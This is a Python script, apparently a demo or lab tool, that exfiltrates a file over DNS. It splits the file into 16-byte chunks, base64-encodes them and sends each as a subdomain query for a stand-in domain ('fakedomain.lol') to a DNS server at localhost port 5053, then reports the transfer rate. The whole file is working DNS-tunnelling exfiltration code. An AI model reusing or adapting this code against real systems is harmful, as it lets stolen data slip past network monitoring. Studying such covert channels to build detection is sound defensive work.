from dnslib import DNSRecord

from sys import argv
from base64 import b64encode
import socket
import time

DNSSERVER_IP = '127.0.0.1'
DNSSERVER_PORT = 5053


def main():
    filename = argv[1]

    dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns_socket.connect((DNSSERVER_IP, DNSSERVER_PORT))

    print(" ==> Starting payload transfer... ")
    current_time = time.time()
    payload_transferred = 0

    with open(filename, 'rb') as f:
        while True:
            chunk = f.read(16)
            if not chunk:
                break

            payload_transferred += len(chunk)
            encoded_payload = b64encode(chunk).decode('ascii')

            question = DNSRecord.question(
                encoded_payload + '.fakedomain.lol', 'A')

            dns_socket.send(question.pack())

    total_time = time.time() - current_time
    print(" ==> Trasfer compeleted in %.2f seconds (%d kb/sec)" %
          (total_time, int((payload_transferred / 1024) / total_time)))


if __name__ == '__main__':
    main()
